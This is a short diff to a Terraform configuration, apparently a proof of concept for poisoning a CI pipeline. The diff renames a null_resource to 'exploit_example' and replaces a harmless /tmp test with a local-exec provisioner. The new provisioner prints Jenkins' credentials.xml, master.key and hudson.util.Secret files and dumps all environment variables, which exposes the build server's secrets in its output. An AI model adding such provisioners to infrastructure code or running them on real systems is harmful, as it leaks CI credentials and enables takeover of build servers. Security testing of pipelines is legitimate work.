@@ -1,9 +1,13 @@
-resource "null_resource" "example" {
+resource "null_resource" "exploit_example" {
   provisioner "local-exec" {
     command = <<EOT
     #!/bin/bash
-    echo Pwned2 > /tmp/pwned
-    cat /tmp/pwned > /tmp/output.txt
+    echo Pwned22
+    cat $JENKINS_HOME/credentials.xml 
+    cat $JENKINS_HOME/secrets/master.key
+    cat $JENKINS_HOME/secrets/hudson.util.Secret 
+    printenv
+    date
     EOT
   }
   triggers = {
@@ -11,11 +15,3 @@ resource "null_resource" "example" {
   }
 }
 
-data "local_file" "example_output" {
-  filename = "/tmp/output.txt"
-  depends_on = [null_resource.example]
-}
-
-output "command_result" {
-  value = data.local_file.example_output.content
-}
